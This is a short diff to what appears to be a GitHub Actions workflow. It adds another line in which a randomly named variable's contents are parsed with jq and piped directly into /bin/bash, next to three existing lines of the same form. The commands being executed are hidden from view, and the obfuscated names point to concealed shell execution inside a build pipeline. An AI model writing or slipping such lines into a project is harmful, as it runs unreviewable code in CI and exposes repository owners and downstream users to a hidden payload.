@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$skxly1" | jq -r .xclv2550 | /bin/bash
           echo $g17653 | jq -r .uk3634 | /bin/bash
           echo $qjcxu7318 | jq -r .ksli5 | /bin/bash
+          echo $zhky819 | jq -r .xyw5 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
